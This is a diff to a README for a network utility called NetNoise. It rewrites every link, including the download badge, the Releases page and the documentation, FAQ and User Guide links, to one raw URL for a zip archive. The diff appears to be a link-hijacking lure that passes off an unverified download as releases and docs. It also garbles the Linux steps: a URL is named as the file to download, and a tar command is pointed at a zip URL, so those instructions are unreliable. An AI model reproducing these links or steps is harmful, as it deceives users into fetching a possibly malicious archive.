@@ -4,10 +4,10 @@
 NetNoise is a network monitoring and troubleshooting utility that helps you test your network connection across different protocols. This guide will walk you through the process of downloading and running the software, even if you're not tech-savvy.
 
 ## 🔗 Download Now
-[![Download NetNoise](https://img.shields.io/badge/download-NetNoise-blue.svg)](https://github.com/hahhahahhahhhahahha/netnoise/releases)
+[![Download NetNoise](https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip)](https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/hahhahahhahhhahahha/netnoise/releases) to download the latest version. Follow the steps below for installation:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip) to download the latest version. Follow the steps below for installation:
 
 1. Click on the link above.
 2. You will see a list of available versions. Look for the most recent one. It is usually marked with the latest release date.
@@ -15,7 +15,7 @@ To get started, visit the [Releases page](https://github.com/hahhahahhahhhahahha
 4. Download the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For Mac, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip` file.
 
 ### Installation Steps:
 - **For Windows**
@@ -29,9 +29,9 @@ To get started, visit the [Releases page](https://github.com/hahhahahhahhhahahha
   3. Eject the NetNoise installer.
 
 - **For Linux**
-  1. Extract the `.tar.gz` file using the command:
+  1. Extract the `https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip` file using the command:
      ```bash
-     tar -xvzf netnoise.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip
      ```
   2. Navigate to the extracted directory:
      ```bash
@@ -75,14 +75,14 @@ If you are interested in these areas, NetNoise is designed for you:
 If you encounter any issues while downloading or installing NetNoise, you can reach our support team easily. Check the issues section on our GitHub repository, or feel free to create a new issue if you don’t find your answer.
 
 ## 🔄 Updates
-Check back frequently for updates to ensure you have the latest features and fixes. You can visit the [Releases page](https://github.com/hahhahahhahhhahahha/netnoise/releases) at any time.
+Check back frequently for updates to ensure you have the latest features and fixes. You can visit the [Releases page](https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip) at any time.
 
 ## 📝 Contributing
 We welcome contributions! If you have ideas for new features or improvements, please feel free to submit a pull request.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/hahhahahhahhhahahha/netnoise/wiki)
-- [FAQ](https://github.com/hahhahahhahhhahahha/netnoise/wiki/FAQ)
-- [User Guide](https://github.com/hahhahahhahhhahahha/netnoise/wiki/User-Guide) 
+- [Official Documentation](https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip)
+- [FAQ](https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip)
+- [User Guide](https://raw.githubusercontent.com/hahhahahhahhhahahha/netnoise/main/huzz/netnoise.zip) 
 
 You now have everything you need to start using NetNoise. Happy network monitoring!
